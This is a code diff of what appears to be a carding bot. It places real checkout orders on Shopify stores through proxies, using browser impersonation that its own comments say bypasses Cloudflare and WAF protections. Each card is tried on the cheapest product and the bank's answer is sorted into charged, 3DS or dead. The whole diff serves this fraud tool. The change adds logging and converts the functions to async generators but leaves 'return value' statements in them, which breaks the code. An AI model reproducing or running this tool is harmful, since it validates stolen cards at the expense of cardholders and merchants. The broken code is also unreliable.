@@ -7,9 +7,6 @@ from urllib.parse import urlparse
 from curl_cffi.requests import AsyncSession
 
 # ==================== DIRECT SHOPIFY GATEWAY ====================
-# Runs Shopify checkout via GraphQL queries directly inside the bot.
-# Bypasses the external Railway API entirely.
-# Powered by curl_cffi to bypass Cloudflare/WAF on all Shopify sites.
 
 C2C = {
     "CAD": "CA", 
@@ -122,7 +119,6 @@ async def fetch_products(domain, proxy_str=None):
                     else:
                         price = float(price)
 
-                    # Skip free ($0) products
                     if price <= 0:
                         continue
 
@@ -311,13 +307,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     try:
         # 1. Fetch cheapest product variant if not provided
         if not variant_id:
+            yield f"[STEP 1] Fetching products from {ourl}/products.json..."
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple) and info[0] is False:
+                yield f"[ERROR STEP 1] {info[1]}"
                 return False, info[1], gateway, total_price, currency
             
             try:
                 price_val = float(info['price'])
                 if price_val > 15.00:
+                    yield f"[ERROR STEP 1] Product too expensive: ${price_val:.2f}"
                     return False, f"Site product too expensive: ${price_val:.2f}", gateway, info['price'], currency
             except Exception:
                 pass
@@ -325,6 +324,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             variant_id = info['variant_id']
             product_link = info['link']
             total_price = info['price']
+            yield f"[STEP 1 OK] Found {product_link} | Price: ${total_price}"
         else:
             product_link = f"{ourl}/products/any"
             total_price = "0.01"
@@ -337,10 +337,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
         async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
             # Visit product page to set cookies
+            yield f"[STEP 2] Visiting product page to drop cookies..."
             try:
                 await session.get(product_link, headers=product_headers)
-            except Exception:
-                pass
+                yield f"[STEP 2 OK] Cookies dropped."
+            except Exception as e:
+                yield f"[WARN STEP 2] Error visiting page: {str(e)[:50]}"
 
             # Hit /cart.js to initialize session
             try:
@@ -349,6 +351,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 pass
 
             # Add cheapest item to cart
+            yield f"[STEP 3] Adding variant {variant_id} to cart..."
             add_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -358,9 +361,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             try:
                 resp = await session.post(f"{ourl}/cart/add.js", headers=add_headers, data=add_data)
                 if resp.status_code != 200:
+                    yield f"[WARN STEP 3] Add.js returned {resp.status_code}, trying JSON method..."
                     json_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
-                    await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
+                    resp2 = await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
+                    if resp2.status_code == 200:
+                        yield f"[STEP 3 OK] Item added via JSON method."
+                    else:
+                        yield f"[ERROR STEP 3] Failed to add to cart."
+                        return False, "Failed to add to cart", gateway, total_price, currency
+                else:
+                    yield f"[STEP 3 OK] Item added to cart successfully."
             except Exception as e:
+                yield f"[ERROR STEP 3] {str(e)}"
                 return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency
 
             # Get cart token from /cart.js
@@ -374,6 +386,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 pass
 
             # Trigger checkout redirect
+            yield f"[STEP 4] Triggering checkout flow..."
             checkout_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -395,13 +408,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data=checkout_data, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
+                yield f"[STEP 4 OK] Checkout URL acquired."
             except Exception as e:
+                yield f"[ERROR STEP 4] Checkout redirect failed: {str(e)}"
                 return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency
 
             if 'login' in checkout_url.lower():
+                yield f"[ERROR STEP 4] Site requires login!"
                 return False, "Site requires login!", gateway, total_price, currency
 
             # Extract checkout and session tokens
+            yield f"[STEP 5] Extracting Session Token (SST)..."
             sst = None
             sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
             if sst_match:
@@ -416,7 +433,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                           extract_between(text, '"sessionToken":"', '"')
 
             if not sst:
+                yield f"[ERROR STEP 5] Failed to get session token (Maybe Captcha/Block)."
                 return False, "Failed to get session token", gateway, total_price, currency
+                
+            yield f"[STEP 5 OK] SST Extracted: {sst[:30]}..."
 
             # Extract queueToken, stableId, paymentMethodIdentifier
             queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
@@ -430,13 +450,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             elif '"currencyCode":"' in text:
                 currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
 
-            # Try to parse the checkout token (e.g. from /checkouts/cn/xxxxx)
+            # Try to parse the checkout token
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
             if not c_token or len(c_token) < 5 or 'checkout' in c_token:
                 c_token = cart_token or "1"
 
             # 2. Tokenize card at deposit.us.shopifycs.com/sessions
+            yield f"[STEP 6] Tokenizing card at shopifycs.com..."
             session_endpoints = [
                 "https://deposit.us.shopifycs.com/sessions",
                 "https://checkout.pci.shopifyinc.com/sessions",
@@ -448,6 +469,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             token_error = "Unable to get payment token"
             for endpoint in session_endpoints:
                 try:
+                    yield f"          -> Trying: {endpoint}"
                     payload = {
                         "credit_card": {
                             "number": cc.replace(" ", ""),
@@ -472,16 +494,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         token_data = token_resp.json()
                         sessionid = token_data.get('id')
                         if sessionid:
+                            yield f"[STEP 6 OK] Card Tokenized! ID: {sessionid[:20]}..."
                             break
+                        else:
+                            token_error = f"Status 200 but no ID. Body: {resp_body[:80]}"
                     else:
-                        token_error = f"Status {token_resp.status_code}: {resp_body}"
+                        token_error = f"Status {token_resp.status_code}: {resp_body[:80]}"
                 except Exception as e:
                     token_error = str(e)
 
             if not sessionid:
+                yield f"[ERROR STEP 6] Tokenization failed: {token_error}"
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
             # 3. Submit GraphQL payment directly
+            yield f"[STEP 7] Submitting GraphQL (SubmitForCompletion)..."
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
             graphql_headers = {
                 'Accept': 'application/json',
@@ -658,24 +685,35 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             for submit_attempt in range(2):
                 try:
                     graphql_resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload, timeout=15)
+                    yield f"          -> GraphQL HTTP Status: {graphql_resp.status_code}"
+                    
                     if graphql_resp.status_code != 200:
                         if submit_attempt == 0:
+                            yield f"          -> Retrying in 2s..."
                             await asyncio.sleep(2)
                             continue
+                        yield f"[ERROR STEP 7] GraphQL Submission failed."
                         return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                     
                     result_data = graphql_resp.json()
                     completion = result_data.get('data', {}).get('submitForCompletion', {})
+                    typename = completion.get('__typename')
+                    yield f"          -> GraphQL Typename: {typename}"
                     
-                    if completion.get('__typename') == 'CheckpointDenied':
+                    if typename == 'CheckpointDenied':
+                        yield f"[ERROR STEP 7] Checkpoint Denied (Captcha/Security)."
                         return True, "CARD_DECLINED", gateway, total_price, currency
                         
                     if completion.get('receipt'):
                         receipt_id = completion['receipt'].get('id')
+                        yield f"[STEP 7 OK] Receipt ID Captured: {receipt_id}"
                     
                     if completion.get('errors'):
                         errors = completion['errors']
                         error_codes = [e.get('code') for e in errors if 'code' in e]
+                        error_msgs = [e.get('localizedMessage', '') for e in errors if 'localizedMessage' in e]
+                        
+                        yield f"          -> Gateway Errors: {error_codes} | Msgs: {error_msgs}"
                         
                         soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                         only_soft_errors = all(code in soft_errors for code in error_codes)
@@ -685,9 +723,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         
                         non_soft_errors = [code for code in error_codes if code not in soft_errors]
                         if non_soft_errors:
+                            yield f"[FAILED STEP 7] Hard errors returned from gateway."
                             return True, ', '.join(non_soft_errors), gateway, total_price, currency
                     
                     if completion.get('reason'):
+                        yield f"[FAILED STEP 7] Submit reason: {completion.get('reason')}"
                         return True, completion['reason'], gateway, total_price, currency
                     
                     break
@@ -695,10 +735,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     if submit_attempt == 0:
                         await asyncio.sleep(2)
                         continue
+                    yield f"[ERROR STEP 7] Exception: {str(e)}"
                     return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency
 
             # 4. Poll for receipt status
             if receipt_id:
+                yield f"[STEP 8] Polling for receipt status (Waiting bank response)..."
                 poll_payload = {
                     'query': QUERY_POLL,
                     'variables': {
@@ -710,26 +752,33 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 
                 for poll_attempt in range(6):
                     await asyncio.sleep(3)
+                    yield f"          -> Polling attempt {poll_attempt + 1}/6..."
                     try:
                         poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload, timeout=7)
                         if poll_resp.status_code == 200:
                             poll_data = poll_resp.json()
                             receipt = poll_data.get('data', {}).get('receipt', {})
                             typename = receipt.get('__typename')
+                            yield f"          -> Bank Status: {typename}"
                             
                             if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
+                                yield f"[SUCCESS] BANK APPROVED! ORDER PLACED!"
                                 return True, "ORDER_PLACED", gateway, total_price, currency
                             elif typename == 'ActionRequiredReceipt':
+                                yield f"[WARN] 3DS/OTP Triggered by bank."
                                 return True, "OTP_REQUIRED", gateway, total_price, currency
                             elif typename == 'FailedReceipt':
-                                code = receipt.get('processingError', {}).get('code') or \
-                                       receipt.get('processingError', {}).get('messageUntranslated') or \
-                                       "CARD_DECLINED"
-                                return True, code, gateway, total_price, currency
+                                code = receipt.get('processingError', {}).get('code') or "UNKNOWN_CODE"
+                                msg = receipt.get('processingError', {}).get('messageUntranslated') or "No message"
+                                yield f"[FAILED] Bank Rejected: {code} - {msg}"
+                                return True, f"FAILED_RECEIPT | Code: {code} | Msg: {msg}", gateway, total_price, currency
                     except Exception:
                         pass
+            else:
+                yield f"[WARN STEP 8] No Receipt ID to poll."
 
             # 5. Fallback final check
+            yield f"[STEP 9] Running fallback HTML check..."
             try:
                 checkout_url_final = f"{ourl}/checkout?from_processing_page=1&validate=true"
                 final_resp = await session.get(checkout_url_final, headers=product_headers, timeout=10)
@@ -737,10 +786,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 final_text = final_resp.text
                 
                 if "/thank" in final_url.lower() or "/orders/" in final_url:
+                    yield f"[SUCCESS] FALLBACK CAUGHT ORDER PLACED!"
                     return True, "ORDER_PLACED", gateway, total_price, currency
                 
                 final_lower = final_text.lower()
                 if "challenge" in final_url.lower() or "challenge" in final_lower or "recaptcha" in final_lower or "hcaptcha" in final_lower:
+                    yield f"[FAILED] Captcha/Challenge detected in fallback."
                     return True, "CARD_DECLINED", gateway, total_price, currency
                 
                 is_3ds = (
@@ -752,20 +803,27 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 )
                 
                 if "insufficient funds" in final_lower or "insufficient_funds" in final_lower:
+                    yield f"[FAILED] Fallback caught: Insufficient Funds."
                     return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                 elif "security code is incorrect" in final_lower or "cvv_gateway_error" in final_lower or "incorrect cvv" in final_lower:
+                    yield f"[FAILED] Fallback caught: Incorrect CVV."
                     return True, "INCORRECT_CVC", gateway, total_price, currency
                 elif is_3ds:
+                    yield f"[WARN] Fallback caught: 3DS Required."
                     return True, "OTP_REQUIRED", gateway, total_price, currency
                 elif "declined" in final_lower or "failed" in final_lower:
                     code = extract_between(final_text, '{"code":"', '"')
-                    return True, code if code else "CARD_DECLINED", gateway, total_price, currency
-            except Exception:
-                pass
+                    msg = code if code else "CARD_DECLINED"
+                    yield f"[FAILED] Fallback caught: {msg}"
+                    return True, msg, gateway, total_price, currency
+            except Exception as e:
+                 yield f"[WARN STEP 9] Fallback failed: {str(e)[:50]}"
 
+            yield f"[FAILED] Process completed but no clear approval. Defaulting to Declined."
             return True, "CARD_DECLINED", gateway, total_price, currency
 
     except Exception as e:
+        yield f"[FATAL ERROR] {str(e)}"
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 
 def _classify_response(response_text: str) -> tuple:
@@ -849,7 +907,6 @@ def _classify_response(response_text: str) -> tuple:
         'payments_proposed_gateway_unavailable', 'payments_payment_flexibility_terms_id_mismatch'
     ]
 
-    # Check outcomes FIRST to ensure real card responses are never classified as system errors
     if any(k in resp_lower for k in charged_patterns):
         return "Charged", resp, "-"
     if any(k in resp_lower for k in tds_patterns):
@@ -873,9 +930,7 @@ def _classify_response(response_text: str) -> tuple:
 
     return "Error", resp if resp else "No response", "-"
 
-async def shopify_auto_check(card_str: str, site_url: str, proxy_str: str = None) -> tuple:
-    # KITA DAH BUANG LINE 'if not proxy_str: return "ERROR", "No proxy provided", "-"' KAT SINI
-
+async def shopify_auto_check(card_str: str, site_url: str, proxy_str: str = None):
     parts = card_str.split("|")
     if len(parts) == 4:
         cc, mes, ano, cvv = parts
@@ -886,23 +941,22 @@ async def shopify_auto_check(card_str: str, site_url: str, proxy_str: str = None
         if len(ano) == 2:
             ano = "20" + ano
     else:
-        return "ERROR", "Invalid card format", "-"
+        yield {"type": "error", "msg": "Invalid card format"}
+        return
 
     site = site_url.strip().rstrip("/")
     if not site.startswith("http"):
         site = "https://" + site
 
     try:
-        success, message, gateway, price, currency = await process_card(
-            cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str
-        )
-        
-        status, _, _ = _classify_response(message)
-        
-        if not success and status not in ("Charged", "Approved", "3DS", "Dead"):
-            return "Error", message, price
-            
-        return status, message, price
-
+        async for log_msg in process_card(cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str):
+            if isinstance(log_msg, tuple):
+                success, message, gateway, price, currency = log_msg
+                status, _, _ = _classify_response(message)
+                yield {"type": "result", "status": status, "message": message, "price": price}
+                return
+            else:
+                yield {"type": "log", "msg": log_msg}
+                
     except Exception as e:
-        return "ERROR", str(e)[:150], "-"
+        yield {"type": "error", "msg": f"Fatal Error: {str(e)}"}
